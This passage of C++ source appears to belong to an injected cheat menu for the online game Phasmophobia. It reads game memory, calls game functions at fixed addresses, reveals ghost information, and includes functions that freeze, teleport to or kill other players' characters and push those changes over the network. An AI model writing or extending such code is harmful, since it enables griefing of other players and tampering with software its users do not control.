                if (Phasmo_Safe(list, sizeof(Il2CppListPlayer))) {
                    const int32_t count = list->_size;
                    if (count > 0 && count <= 64) {
                        void* items = list->_items;
                        if (items) {
                            const size_t arrayBytes = Phasmo::ARRAY_FIRST_ELEMENT + static_cast<size_t>(count) * sizeof(void*);
                            if (Phasmo_Safe(items, arrayBytes)) {
                                Phasmo::Player** entries = reinterpret_cast<Phasmo::Player**>(
                                    reinterpret_cast<uint8_t*>(items) + Phasmo::ARRAY_FIRST_ELEMENT);

                                for (int32_t i = 0; i < count; ++i) {
                                    Phasmo::Player* candidate = entries[i];
                                    if (!candidate || !Phasmo_Safe(candidate, sizeof(Phasmo::Player)))
                                        continue;

                                    void* pv = candidate->photonView;
                                    if (!pv || !Phasmo_Safe(pv, 0x40))
                                        continue;

                                    const bool isMine = Phasmo_Call<bool>(Phasmo::RVA_PV_get_IsMine, pv, nullptr);
                                    if (!isMine)
                                        continue;

                                    s_localPlayer = candidate;
                                    return true;
                                }
                            }
                        }
                    }
                }
            }
        }

        Phasmo::Network* network = Phasmo_GetNetwork();
        if (network && Phasmo_Safe(network, sizeof(Phasmo::Network))) {
            Phasmo::Player* candidate = reinterpret_cast<Phasmo::Player*>(network->localPlayer);
            if (candidate && Phasmo_Safe(candidate, sizeof(Phasmo::Player))) {
                s_localPlayer = candidate;
                return true;
            }
        }

        return false;
    }

    static bool EnsureLocalPlayer()
    {
        if (s_localPlayer && Phasmo_Safe(s_localPlayer, sizeof(Phasmo::Player)))
            return true;

        s_localPlayer = nullptr;
        return RefreshLocalPlayer();
    }

    static bool IsInGame()
    {
        Phasmo::LevelValues* values = Phasmo_GetLevelValues();
        return values && Phasmo_Safe(values, sizeof(Phasmo::LevelValues)) && values->inGame;
    }

    static Il2CppListPlayer* QueryMapPlayerList()
    {
        Phasmo::MapController* map = Phasmo_GetMapController();
        if (!map || !Phasmo_Safe(map, sizeof(Phasmo::MapController)))
            return nullptr;

        void* listPtr = map->players;
        if (!listPtr || !Phasmo_Safe(listPtr, sizeof(Il2CppListPlayer)))
            return nullptr;

        Il2CppListPlayer* list = reinterpret_cast<Il2CppListPlayer*>(listPtr);
        if (!Phasmo_Safe(list, sizeof(Il2CppListPlayer)))
            return nullptr;

        if (list->_size <= 0 || list->_size > 64 || !list->_items)
            return nullptr;

        const size_t arrayBytes = Phasmo::ARRAY_FIRST_ELEMENT + static_cast<size_t>(list->_size) * sizeof(void*);
        if (!Phasmo_Safe(list->_items, arrayBytes))
            return nullptr;

        return list;
    }

    static Phasmo::Player* GetMapPlayerAt(Il2CppListPlayer* list, int32_t index)
    {
        if (!list || index < 0 || index >= list->_size)
            return nullptr;

        Phasmo::Player** entries = reinterpret_cast<Phasmo::Player**>(
            reinterpret_cast<uint8_t*>(list->_items) + Phasmo::ARRAY_FIRST_ELEMENT);
        Phasmo::Player* player = entries[index];
        return Phasmo_Safe(player, sizeof(Phasmo::Player)) ? player : nullptr;
    }

    static Phasmo::Player* ResolvePlayerSlot(int32_t slot)
    {
        if (slot < 0)
            return nullptr;

        Il2CppListPlayer* list = QueryMapPlayerList();
        if (!list || slot >= list->_size)
            return nullptr;

        return GetMapPlayerAt(list, slot);
    }

    static const char* RoleName(Phasmo::PlayerRoleType role)
    {
        return Phasmo::GetRoleName(role);
    }

    static Phasmo::NetworkPlayerSpot* GetPlayerSpot(Phasmo::Player* player)
    {
        if (!player)
            return nullptr;

        Phasmo::Network* network = Phasmo_GetNetwork();
        if (!network || !Phasmo_Safe(network, sizeof(Phasmo::Network)))
            return nullptr;

        Il2CppListPlayer* list = reinterpret_cast<Il2CppListPlayer*>(network->playerSpots);
        if (!list || !Phasmo_Safe(list, sizeof(Il2CppListPlayer)) || !list->_items || list->_size <= 0 || list->_size > 32)
            return nullptr;

        const size_t arrayBytes = Phasmo::ARRAY_FIRST_ELEMENT + static_cast<size_t>(list->_size) * sizeof(void*);
        if (!Phasmo_Safe(list->_items, arrayBytes))
            return nullptr;

        auto** items = reinterpret_cast<Phasmo::NetworkPlayerSpot**>(
            reinterpret_cast<uint8_t*>(list->_items) + Phasmo::ARRAY_FIRST_ELEMENT);

        for (int32_t i = 0; i < list->_size; ++i) {
            Phasmo::NetworkPlayerSpot* spot = items[i];
            if (!spot || !Phasmo_Safe(spot, sizeof(Phasmo::NetworkPlayerSpot)))
                continue;
            if (spot->player == player)
                return spot;
        }

        return nullptr;
    }

    static Phasmo::NetworkPlayerSpot* GetLocalNetworkSpot()
    {
        Phasmo::Network* network = Phasmo_GetNetwork();
        if (!network || !Phasmo_Safe(network, sizeof(Phasmo::Network)))
            return nullptr;

        Il2CppListPlayer* list = reinterpret_cast<Il2CppListPlayer*>(network->playerSpots);
        if (!list || !Phasmo_Safe(list, sizeof(Il2CppListPlayer)) || !list->_items || list->_size <= 0 || list->_size > 32)
            return nullptr;

        const size_t arrayBytes = Phasmo::ARRAY_FIRST_ELEMENT + static_cast<size_t>(list->_size) * sizeof(void*);
        if (!Phasmo_Safe(list->_items, arrayBytes))
            return nullptr;

        void* localPhotonPlayer = TryGetPhotonLocalPlayerRaw();
        Phasmo::Player* localMapPlayer = nullptr;
        if (network->localPlayer && Phasmo_Safe(network->localPlayer, sizeof(Phasmo::Player)))
            localMapPlayer = reinterpret_cast<Phasmo::Player*>(network->localPlayer);
        else if (s_localPlayer && Phasmo_Safe(s_localPlayer, sizeof(Phasmo::Player)))
            localMapPlayer = s_localPlayer;

        auto** items = reinterpret_cast<Phasmo::NetworkPlayerSpot**>(
            reinterpret_cast<uint8_t*>(list->_items) + Phasmo::ARRAY_FIRST_ELEMENT);

        for (int32_t i = 0; i < list->_size; ++i) {
            Phasmo::NetworkPlayerSpot* spot = items[i];
            if (!spot || !Phasmo_Safe(spot, sizeof(Phasmo::NetworkPlayerSpot)))
                continue;
            if (localPhotonPlayer && spot->photonPlayer == localPhotonPlayer)
                return spot;
            if (localMapPlayer && spot->player == localMapPlayer)
                return spot;
        }

        return nullptr;
    }

    static Phasmo::NetworkPlayerSpot* GetNetworkSpotAtIndex(int32_t index)
    {
        if (index < 0)
            return nullptr;

        Phasmo::Network* network = Phasmo_GetNetwork();
        if (!network || !Phasmo_Safe(network, sizeof(Phasmo::Network)))
            return nullptr;

        Il2CppListPlayer* list = reinterpret_cast<Il2CppListPlayer*>(network->playerSpots);
        if (!list || !Phasmo_Safe(list, sizeof(Il2CppListPlayer)) || !list->_items || list->_size <= 0 || list->_size > 32)
            return nullptr;

        if (index >= list->_size)
            return nullptr;

        const size_t arrayBytes = Phasmo::ARRAY_FIRST_ELEMENT + static_cast<size_t>(list->_size) * sizeof(void*);
        if (!Phasmo_Safe(list->_items, arrayBytes))
            return nullptr;

        auto** items = reinterpret_cast<Phasmo::NetworkPlayerSpot**>(
            reinterpret_cast<uint8_t*>(list->_items) + Phasmo::ARRAY_FIRST_ELEMENT);
        Phasmo::NetworkPlayerSpot* spot = items[index];
        return (spot && Phasmo_Safe(spot, sizeof(Phasmo::NetworkPlayerSpot))) ? spot : nullptr;
    }

    static std::string GetPlayerName(Phasmo::Player* player)
    {
        if (Phasmo::NetworkPlayerSpot* spot = GetPlayerSpot(player)) {
            if (spot->accountName) {
                std::string name = Phasmo_StringToUtf8(reinterpret_cast<Il2CppString*>(spot->accountName));
                if (!name.empty())
                    return name;
            }
        }

        if (player && player->photonView && Phasmo_Safe(player->photonView, 0x40)) {
            void* owner = Phasmo_Call<void*>(Phasmo::RVA_PV_get_Owner, player->photonView, nullptr);
            if (owner && Phasmo_Safe(owner, Phasmo::PP_NICKNAME + sizeof(void*))) {
                void* namePtr = *reinterpret_cast<void**>(reinterpret_cast<uint8_t*>(owner) + Phasmo::PP_NICKNAME);
                if (namePtr) {
                    std::string name = Phasmo_StringToUtf8(reinterpret_cast<Il2CppString*>(namePtr));
                    if (!name.empty())
                        return name;
                }
            }
        }

        return {};
    }

    static bool IsLocalMapPlayer(Phasmo::Player* player)
    {
        if (!player)
            return false;
        if (player == s_localPlayer)
            return true;
        if (!player->photonView || !Phasmo_Safe(player->photonView, 0x40))
            return false;

        return Phasmo_Call<bool>(Phasmo::RVA_PV_get_IsMine, player->photonView, nullptr);
    }

    static bool StringContainsNoCase(const std::string& text, const char* needle)
    {
        if (!needle || !*needle)
            return true;

        std::string query(needle);
        if (query.empty())
            return true;

        auto it = std::search(text.begin(), text.end(),
            query.begin(), query.end(),
            [](char a, char b) {
                return static_cast<char>(std::tolower(static_cast<unsigned char>(a))) ==
                    static_cast<char>(std::tolower(static_cast<unsigned char>(b)));
            });
        return it != text.end();
    }

    static bool PassDropAllSlotFilter(int slot)
    {
        int minSlot = Cheat::MORE_DropAllFilterSlotMin;
        int maxSlot = Cheat::MORE_DropAllFilterSlotMax;
        if (minSlot > maxSlot)
            std::swap(minSlot, maxSlot);
        return slot >= minSlot && slot <= maxSlot;
    }

    static bool PassDropAllOwnerFilter(Phasmo::Player* player)
    {
        switch (Cheat::MORE_DropAllFilterOwnerMode) {
        case 0: // Any
            return true;
        case 1: // Local only
            return IsLocalMapPlayer(player);
        case 2: // Remote only
            return !IsLocalMapPlayer(player);
        case 3: { // Name contains
            std::string name = GetPlayerName(player);
            return !name.empty() && StringContainsNoCase(name, Cheat::MORE_DropAllFilterOwner);
        }
        default:
            return true;
        }
    }

    static const char* GhostTypeName(Phasmo::GhostType type)
    {
        switch (type)
        {
        case Phasmo::GhostType::Spirit: return "Spirit";
        case Phasmo::GhostType::Wraith: return "Wraith";
        case Phasmo::GhostType::Phantom: return "Phantom";
        case Phasmo::GhostType::Poltergeist: return "Poltergeist";
        case Phasmo::GhostType::Banshee: return "Banshee";
        case Phasmo::GhostType::Jinn: return "Jinn";
        case Phasmo::GhostType::Mare: return "Mare";
        case Phasmo::GhostType::Revenant: return "Revenant";
        case Phasmo::GhostType::Shade: return "Shade";
        case Phasmo::GhostType::Demon: return "Demon";
        case Phasmo::GhostType::Yurei: return "Yurei";
        case Phasmo::GhostType::Oni: return "Oni";
        case Phasmo::GhostType::Yokai: return "Yokai";
        case Phasmo::GhostType::Hantu: return "Hantu";
        case Phasmo::GhostType::Goryo: return "Goryo";
        case Phasmo::GhostType::Myling: return "Myling";
        case Phasmo::GhostType::Onryo: return "Onryo";
        case Phasmo::GhostType::TheTwins: return "The Twins";
        case Phasmo::GhostType::Raiju: return "Raiju";
        case Phasmo::GhostType::Obake: return "Obake";
        case Phasmo::GhostType::Mimic: return "Mimic";
        case Phasmo::GhostType::Moroi: return "Moroi";
        case Phasmo::GhostType::Deogen: return "Deogen";
        case Phasmo::GhostType::Thaye: return "Thaye";
        case Phasmo::GhostType::Gallu: return "Gallu";
        case Phasmo::GhostType::Dayan: return "Dayan";
        case Phasmo::GhostType::Obambo: return "Obambo";
        case Phasmo::GhostType::None: return "None";
        default: return "Unknown";
        }
    }

    static const char* EvidenceTypeName(int evidenceType)
    {
        switch (evidenceType)
        {
        case 0: return "EMF Spot";
        case 1: return "Ouija Board";
        case 2: return "Fingerprints";
        case 3: return "Footstep";
        case 4: return "DNA";
        case 5: return "Ghost";
        case 6: return "Dead Body";
        case 7: return "Dirty Water";
        case 8: return "Music Box";
        case 9: return "Tarot Cards";
        case 10: return "Summoning Circle";
        case 11: return "Haunted Mirror";
        case 12: return "Voodoo Doll";
        case 13: return "Ghost Writing";
        case 14: return "Used Crucifix";
        case 15: return "D.O.T.S";
        case 16: return "Monkey Paw";
        case 17: return "Moon Alter";
        case 18: return "Ghost Orbs";
        case 19: return "Light Source";
        case 20: return "None";
        case 21: return "EMF 5";
        case 22: return "Salt";
        case 23: return "Freezing Temps";
        case 24: return "Ghost Smoke";
        case 25: return "Camo Ghost";
        case 26: return "Paranormal Sound";
        case 27: return "Spirit Box";
        case 28: return "Ghost Hunt";
        case 29: return "Banshee Wail";
        case 30: return "Teddy Bear";
        case 31: return "Spirit Box Breath";
        case 32: return "Motion Sensor";
        case 33: return "Shadow Ghost";
        case 34: return "Ghost Groan";
        case 35: return "Ghost Laugh";
        case 36: return "Ghost Talk";
        case 37: return "Ghost Whisper";
        case 38: return "Obake Fingerprint";
        case 39: return "Burning Chapel Crucifix";
        case 40: return "Obake Shapeshift";
        default: return "Unknown";
        }
    }

    static std::string EvidenceListToString(void* listPtr)
    {
        if (!listPtr || !Phasmo_Safe(listPtr, sizeof(Phasmo::Il2CppList<int32_t>)))
            return {};

        auto* list = reinterpret_cast<Phasmo::Il2CppList<int32_t>*>(listPtr);
        if (!Phasmo_Safe(list, sizeof(Phasmo::Il2CppList<int32_t>)))
            return {};

        int count = list->_size;
        if (count <= 0)
            return {};

        if (count > 32)
            count = 32;

        if (!list->_items || !Phasmo_Safe(list->_items, 0x20 + count * sizeof(int32_t)))
            return {};

        std::string out;
        out.reserve(static_cast<size_t>(count) * 10);

        const int32_t* items = reinterpret_cast<const int32_t*>(
            reinterpret_cast<uint8_t*>(list->_items) + Phasmo::ARRAY_FIRST_ELEMENT);

        for (int i = 0; i < count; ++i) {
            int evidence = items[i];
            const char* name = EvidenceTypeName(evidence);
            if (!name || !*name)
                continue;
            if (strcmp(name, "None") == 0 && count > 1)
                continue;

            if (!out.empty())
                out += ", ";
            out += name;
        }

        return out;
    }

    static std::vector<int32_t> GetEvidenceListValues(void* listPtr)
    {
        std::vector<int32_t> values;
        if (!listPtr || !Phasmo_Safe(listPtr, sizeof(Phasmo::Il2CppList<int32_t>)))
            return values;

        auto* list = reinterpret_cast<Phasmo::Il2CppList<int32_t>*>(listPtr);
        const int count = std::clamp(list->_size, 0, 32);
        if (count <= 0 || !list->_items ||
            !Phasmo_Safe(list->_items, Phasmo::ARRAY_FIRST_ELEMENT + count * sizeof(int32_t)))
            return values;

        const int32_t* items = reinterpret_cast<const int32_t*>(
            reinterpret_cast<uint8_t*>(list->_items) + Phasmo::ARRAY_FIRST_ELEMENT);
        values.reserve(static_cast<size_t>(count));
        for (int i = 0; i < count; ++i)
            values.push_back(items[i]);
        return values;
    }

    static void* TryGetGhostFullEvidenceListRaw(Phasmo::GhostController* ghostController, Phasmo::GhostType ghostType)
    {
        if (!ghostController)
            return nullptr;

        __try {
            return Phasmo_Call<void*>(Phasmo::RVA_GhostController_GetFullEvidence,
                ghostController, ghostType, nullptr);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return nullptr;
        }
    }

    static std::string GetGhostFullEvidenceString(Phasmo::GhostInfo* info)
    {
        if (!info || !Phasmo_Safe(info, sizeof(Phasmo::GhostInfo)))
            return {};

        Phasmo::GhostController* ghostController = Phasmo_GetGhostController();
        if (!ghostController || !Phasmo_Safe(ghostController, 0x28))
            return {};

        void* list = TryGetGhostFullEvidenceListRaw(ghostController, info->ghostTypeInfo.primaryType);
        if (!list)
            return {};
        return EvidenceListToString(list);
    }

    static bool TryGetGhostInfo(Phasmo::GhostAI* ghost, Phasmo::GhostInfo*& out)
    {
        out = nullptr;
        if (!ghost || !Phasmo_Safe(ghost, sizeof(Phasmo::GhostAI)))
            return false;

        Phasmo::GhostInfo* info = ghost->ghostInfo;
        if (!info || !Phasmo_Safe(info, sizeof(Phasmo::GhostInfo)))
            return false;

        out = info;
        return true;
    }

    static std::string GetGhostName(Phasmo::GhostAI* ghost)
    {
        Phasmo::GhostInfo* info = nullptr;
        if (!TryGetGhostInfo(ghost, info))
            return {};

        void* namePtr = info->ghostTypeInfo.ghostName;
        if (!namePtr || !Phasmo_Safe(namePtr, sizeof(Il2CppString)))
            return {};

        return Phasmo_StringToUtf8(reinterpret_cast<Il2CppString*>(namePtr));
    }

    static std::string GetRoomName(void* roomPtr)
    {
        if (!roomPtr || !Phasmo_Safe(roomPtr, 0x68))
            return {};

        auto* room = reinterpret_cast<Phasmo::LevelRoom*>(roomPtr);
        if (!room->roomName || !Phasmo_Safe(room->roomName, sizeof(Il2CppString)))
            return {};

        return Phasmo_StringToUtf8(reinterpret_cast<Il2CppString*>(room->roomName));
    }

    static const char* WeatherName(int weather)
    {
        switch (weather)
        {
        case 0: return "Clear";
        case 1: return "Fog";
        case 2: return "Light Rain";
        case 3: return "Heavy Rain";
        case 4: return "Snow";
        case 5: return "Wind";
        case 6: return "Sunrise";
        case 7: return "Blood Moon";
        default: return "Unknown";
        }
    }

    static const char* DifficultyName(int difficulty)
    {
        switch (difficulty)
        {
        case 0: return "Amateur";
        case 1: return "Intermediate";
        case 2: return "Professional";
        case 3: return "Nightmare";
        case 4: return "Insanity";
        case 5: return "Challenge";
        case 6: return "Custom";
        default: return "Unknown";
        }
    }

    static Phasmo::PlayerRoleType BadgeFromIndex(int index)
    {
        if (index < 0 || index > 53)
            return Phasmo::PlayerRoleType::None;
        return static_cast<Phasmo::PlayerRoleType>(index);
    }

    static int MapTarotUiIndexToEnum(int uiIndex)
    {
        switch (uiIndex)
        {
        case 0: return 2; // The Tower
        case 1: return 1; // The Wheel
        case 2: return 0; // The Fool
        case 3: return 3; // The Devil
        case 4: return 4; // Death
        case 5: return 5; // The Hermit
        case 6: return 7; // The Sun
        case 7: return 6; // The Moon
        case 8: return 8; // The High Priestess
        case 9: return 9; // The Hanged Man
        default: return 0;
        }
    }

    static Phasmo::PhotonObjectInteract* GetHeldInteract(Phasmo::Player* player, uintptr_t offset)
    {
        if (!player || !Phasmo_Safe(player, offset + sizeof(void*)))
            return nullptr;

        void* ptr = *reinterpret_cast<void**>(reinterpret_cast<uint8_t*>(player) + offset);
        return Phasmo_Safe(ptr, sizeof(Phasmo::PhotonObjectInteract))
            ? reinterpret_cast<Phasmo::PhotonObjectInteract*>(ptr)
            : nullptr;
    }

    static void ConfigurePickupInteract(Phasmo::PhotonObjectInteract* interact)
    {
        if (!interact || !Phasmo_Safe(interact, sizeof(Phasmo::PhotonObjectInteract)))
            return;

        interact->isProp = true;
        interact->isItem = true;
        interact->isDroppable = true;
        interact->isUsable = true;
        interact->throwMultiplier = std::max(0.1f, MORE_ThrowStrength);
    }

    static void* GetPlayerCharacterTransform(Phasmo::Player* player)
    {
        if (!player || !Phasmo_Safe(player, sizeof(Phasmo::Player)))
            return nullptr;

        auto character = reinterpret_cast<Phasmo::PlayerCharacter*>(player->playerCharacter);
        if (!character || !Phasmo_Safe(character, sizeof(Phasmo::PlayerCharacter)))
            return nullptr;

        void* transform = character->transform;
        return (transform && Phasmo_Safe(transform, 0xC0)) ? transform : nullptr;
    }

    static Phasmo::PhotonObjectInteract** GetInteractListItems(void* listPtr, int32_t& outCount)
    {
        outCount = 0;
        if (!listPtr || !Phasmo_Safe(listPtr, sizeof(Phasmo::Il2CppList<void*>)))
            return nullptr;

        auto list = reinterpret_cast<Phasmo::Il2CppList<Phasmo::PhotonObjectInteract*>*>(listPtr);
        if (!Phasmo_Safe(list, sizeof(*list)))
            return nullptr;

        const int32_t count = list->_size;
        if (count <= 0 || count > 64 || !list->_items)
            return nullptr;

        const size_t bytes = Phasmo::ARRAY_FIRST_ELEMENT + static_cast<size_t>(count) * sizeof(void*);
        if (!Phasmo_Safe(list->_items, bytes))
            return nullptr;

        outCount = count;
        return reinterpret_cast<Phasmo::PhotonObjectInteract**>(
            reinterpret_cast<uint8_t*>(list->_items) + Phasmo::ARRAY_FIRST_ELEMENT);
    }

    static std::vector<Phasmo::PhotonObjectInteract*> CollectNearbyEquipment()
    {
        std::vector<Phasmo::PhotonObjectInteract*> equipment;
        Il2CppListPlayer* list = QueryMapPlayerList();
        if (!list)
            return equipment;

        std::unordered_set<void*> seen;
        const int32_t count = list->_size;
        if (count <= 0)
            return equipment;

        Phasmo::Player** entries = reinterpret_cast<Phasmo::Player**>(
            reinterpret_cast<uint8_t*>(list->_items) + Phasmo::ARRAY_FIRST_ELEMENT);

        for (int32_t i = 0; i < count; ++i) {
            Phasmo::Player* player = entries[i];
            if (!player || !Phasmo_Safe(player, sizeof(Phasmo::Player)))
                continue;

            Phasmo::PCPropGrab* grab = GetPropGrab(player);
            if (!grab || !Phasmo_Safe(grab, sizeof(Phasmo::PCPropGrab)))
                continue;

            int32_t interactCount = 0;
            Phasmo::PhotonObjectInteract** items = GetInteractListItems(grab->interactList, interactCount);
            if (!items)
                continue;

            for (int32_t idx = 0; idx < interactCount; ++idx) {
                Phasmo::PhotonObjectInteract* interact = items[idx];
                if (!interact || !Phasmo_Safe(interact, sizeof(Phasmo::PhotonObjectInteract)))
                    continue;
                if (!interact->isItem)
                    continue;
                if (!interact->transform || !Phasmo_Safe(interact->transform, 0x20))
                    continue;
                if (!seen.insert(interact).second)
                    continue;
                equipment.push_back(interact);
            }
        }

        return equipment;
    }

    static void ApplyPickupTweaks()
    {
        if ((!MORE_Pickup && !MORE_PickupAnyProp && !MORE_PocketEverything && !MORE_CanPickup) || !s_localPlayer)
            return;

        __try {
            ConfigurePickupInteract(GetHeldInteract(s_localPlayer, 0x70));
            ConfigurePickupInteract(GetHeldInteract(s_localPlayer, 0x78));

            if (MORE_PickupAnyProp || MORE_PocketEverything || MORE_CanPickup) {
                Phasmo::PCPropGrab* grab = reinterpret_cast<Phasmo::PCPropGrab*>(s_localPlayer->pcPropGrab);
                if (grab && Phasmo_Safe(grab, sizeof(Phasmo::PCPropGrab))) {
                    int32_t count = 0;
                    if (auto entries = GetInteractListItems(grab->interactList, count)) {
                        for (int32_t i = 0; i < count; ++i) {
                            Phasmo::PhotonObjectInteract* interact = entries[i];
                            if (!interact || !Phasmo_Safe(interact, sizeof(Phasmo::PhotonObjectInteract)))
                                continue;
                            ConfigurePickupInteract(interact);
                        }
                    }
                }
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static bool TryGetCameraPosition(Phasmo::Vec3& out)
    {
        UnityEngine_Camera_o* cam = GetMainCamera();
        if (!cam) return false;
        void* transform = Phasmo_Call<void*>(Phasmo::RVA_UnityEngine_Component_get_transform, cam, nullptr);
        if (!transform || !Phasmo_Safe(transform, 0xC0)) return false;
        out = Phasmo_GetPosition(transform);
        return true;
    }

    enum class EquipmentOrbitShape
    {
        Circle = 0,
        Square,
        Star,
        Triangle,
        Pentagon,
        Penis,
        FigureEight,
        Count
    };

    static EquipmentOrbitShape GetEquipmentOrbitShape()
    {
        int shape = Cheat::MOV_FlyingEquipmentShape;
        if (shape < 0 || shape >= static_cast<int>(EquipmentOrbitShape::Count))
            shape = 0;
        return static_cast<EquipmentOrbitShape>(shape);
    }

    static ImVec2 SamplePolygon(int vertexCount, float normalized, float rotation = 0.0f, float innerRadius = 0.0f)
    {
        if (vertexCount <= 0)
            return ImVec2(0.0f, 0.0f);

        const float kTwoPi = 6.283185307179586f;
        float wrapped = normalized - floorf(normalized);
        float scaled = wrapped * static_cast<float>(vertexCount);
        int index = static_cast<int>(scaled);
        int next = (index + 1) % vertexCount;
        float local = scaled - static_cast<float>(index);
        float angleA = rotation + (static_cast<float>(index) / vertexCount) * kTwoPi;
        float angleB = rotation + (static_cast<float>(next) / vertexCount) * kTwoPi;
        float radiusA = 1.0f;
        float radiusB = 1.0f;
        if (innerRadius > 0.0f)
        {
            radiusA = (index % 2 == 0) ? 1.0f : innerRadius;
            radiusB = (next % 2 == 0) ? 1.0f : innerRadius;
        }

        ImVec2 pointA = { cosf(angleA) * radiusA, sinf(angleA) * radiusA };
        ImVec2 pointB = { cosf(angleB) * radiusB, sinf(angleB) * radiusB };
        return { pointA.x + (pointB.x - pointA.x) * local, pointA.y + (pointB.y - pointA.y) * local };
    }

    static ImVec2 SampleFigureEight(float normalized)
    {
        const float kTwoPi = 6.283185307179586f;
        float angle = normalized * kTwoPi;
        float x = sinf(2.0f * angle);
        float z = sinf(angle) * cosf(angle);
        return { x, z };
    }

    static ImVec2 SamplePenisShape(float normalized)
    {
        const float kTwoPi = 6.283185307179586f;
        normalized = normalized - floorf(normalized);
        if (normalized < 0.7f)
        {
            float t = normalized / 0.7f;
            float x = -0.8f + t * 2.3f;
            float y = 0.1f + 0.35f * sinf(t * 3.14159265f);
            return { x, y };
        }

        float headT = (normalized - 0.7f) / 0.3f;
        float angle = headT * kTwoPi;
        float x = 1.05f + 0.22f * cosf(angle);
        float y = 0.35f * sinf(angle);
        return { x, y };
    }

    static ImVec2 EvaluateOrbitShape(EquipmentOrbitShape shape, float normalized)
    {
        switch (shape)
        {
        case EquipmentOrbitShape::Circle:
            return SamplePolygon(128, normalized, 0.0f);
        case EquipmentOrbitShape::Square:
            return SamplePolygon(4, normalized, 0.78539816f);
        case EquipmentOrbitShape::Triangle:
            return SamplePolygon(3, normalized, -1.5707963f);
        case EquipmentOrbitShape::Pentagon:
            return SamplePolygon(5, normalized, 1.5707963f);
        case EquipmentOrbitShape::Star:
            return SamplePolygon(10, normalized, 0.0f, 0.5f);
        case EquipmentOrbitShape::Penis:
            return SamplePenisShape(normalized);
        case EquipmentOrbitShape::FigureEight:
            return SampleFigureEight(normalized);
        default:
            return SamplePolygon(128, normalized, 0.0f);
        }
    }

    static void ApplyFlyingEquipmentOrbiter()
    {
        if (!MOV_FlyingEquipment)
            return;

        Phasmo::Vec3 center{};
        // Try player position first (in-game), fall back to camera (lobby).
        if (s_localPlayer) {
            if (!TryGetPlayerCharacterPosition(s_localPlayer, center)) {
                if (!TryGetCameraPosition(center))
                    return;
            }
        } else {
            if (!TryGetCameraPosition(center))
                return;
        }

        center.y += MOV_FlyingEquipmentHeight;
        std::vector<Phasmo::PhotonObjectInteract*> items = CollectNearbyEquipment();
        if (items.empty())
            return;

        static constexpr float kTwoPi = 6.283185307179586f;
        static float s_orbitRotation = 0.0f;
        static ULONGLONG s_lastOrbitMs = 0;

        const ULONGLONG now = GetTickCount64();
        float deltaSec = 0.0f;
        if (s_lastOrbitMs != 0)
            deltaSec = static_cast<float>(now - s_lastOrbitMs) / 1000.0f;
        s_lastOrbitMs = now;

        s_orbitRotation += MOV_FlyingEquipmentSpeed * deltaSec;
        if (s_orbitRotation >= kTwoPi)
            s_orbitRotation = fmodf(s_orbitRotation, kTwoPi);

        EquipmentOrbitShape shape = GetEquipmentOrbitShape();
        float rotationNormalized = s_orbitRotation / kTwoPi;
        rotationNormalized = rotationNormalized - floorf(rotationNormalized);
        const float itemCount = static_cast<float>(items.size());
        if (itemCount <= 0.0f)
            return;

        for (size_t idx = 0; idx < items.size(); ++idx) {
            Phasmo::PhotonObjectInteract* interact = items[idx];
            if (!interact || !interact->transform)
                continue;
            if (!Phasmo_Safe(interact->transform, 0xC0))
                continue;

            float normalized = rotationNormalized + static_cast<float>(idx) / itemCount;
            normalized = normalized - floorf(normalized);
            ImVec2 offset = EvaluateOrbitShape(shape, normalized);
            Phasmo::Vec3 target = {
                center.x + offset.x * MOV_FlyingEquipmentRadius,
                center.y,
                center.z + offset.y * MOV_FlyingEquipmentRadius
            };

            Phasmo_SetPosition(interact->transform, target);
        }
    }

    static bool TryGetPlayerCharacterPosition(Phasmo::Player* player, Phasmo::Vec3& out)
    {
        if (!player)
            return false;

        void* transform = GetPlayerCharacterTransform(player);
        if (!transform)
            return false;

        out = Phasmo_GetPosition(transform);
        return true;
    }

    static bool SetLocalPlayerCharacterPosition(const Phasmo::Vec3& value)
    {
        if (!s_localPlayer)
            return false;

        void* transform = GetPlayerCharacterTransform(s_localPlayer);
        if (!transform)
            return false;

        Phasmo_SetPosition(transform, value);
        return true;
    }

    static void SyncFrozenPlayerNetwork(Phasmo::Player* player, const Phasmo::Vec3& position)
    {
        __try {
            // Keep the freeze state synced for remote players too.
            Phasmo_Call<void>(Phasmo::RVA_Player_Teleport, player, position, nullptr);
            Phasmo_Call<void>(Phasmo::RVA_Player_ToggleFreezePlayer, player, true, nullptr);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static void ApplyFrozenPlayers()
    {
        if (s_frozenPlayers.empty())
            return;

        const ULONGLONG now = GetTickCount64();
        auto it = s_frozenPlayers.begin();
        while (it != s_frozenPlayers.end())
        {
            Phasmo::Player* player = it->player;
            if (!player || !Phasmo_Safe(player, sizeof(Phasmo::Player)))
            {
                it = s_frozenPlayers.erase(it);
                continue;
            }

            void* transform = GetPlayerCharacterTransform(player);
            if (!transform)
            {
                it = s_frozenPlayers.erase(it);
                continue;
            }

            Phasmo_SetPosition(transform, it->position);

            if (now >= it->nextNetworkSnapMs)
            {
                SyncFrozenPlayerNetwork(player, it->position);
                it->nextNetworkSnapMs = now + 250;
            }
            ++it;
        }
    }

    static void FreezePlayer(Phasmo::Player* player)
    {
        if (!player)
            return;

        Phasmo::Vec3 pos;
        if (!TryGetPlayerCharacterPosition(player, pos))
            return;

        auto existing = std::find_if(s_frozenPlayers.begin(), s_frozenPlayers.end(),
            [player](const FrozenRecord& entry) { return entry.player == player; });
        if (existing != s_frozenPlayers.end())
        {
            existing->position = pos;
            existing->nextNetworkSnapMs = 0;
            return;
        }

        s_frozenPlayers.push_back({ player, pos, 0 });
    }

    static void UnfreezePlayer(Phasmo::Player* player)
    {
        if (!player)
            return;

        s_frozenPlayers.erase(
            std::remove_if(s_frozenPlayers.begin(), s_frozenPlayers.end(),
                [player](const FrozenRecord& entry) { return entry.player == player; }),
            s_frozenPlayers.end());
    }

    static void TeleportToSlot(int32_t slot)
    {
        Phasmo::Player* target = ResolvePlayerSlot(slot);
        if (!target || !s_localPlayer)
            return;

        Phasmo::Vec3 pos;
        if (!TryGetPlayerCharacterPosition(target, pos))
            return;

        Phasmo_Call<void>(Phasmo::RVA_Player_Teleport, s_localPlayer, pos, nullptr);
        SetLocalPlayerCharacterPosition(pos);
    }

    static void KillSlotPlayer(int32_t slot)
    {
        Phasmo::Player* target = ResolvePlayerSlot(slot);
        if (!target)
            return;

        Phasmo::PlayerSanity* sanity = Phasmo_GetPlayerSanity(target);
        if (sanity)
            sanity->sanity = 0.0f;

        Phasmo_Call<void>(Phasmo::RVA_Player_KillPlayer, target, nullptr);
    }

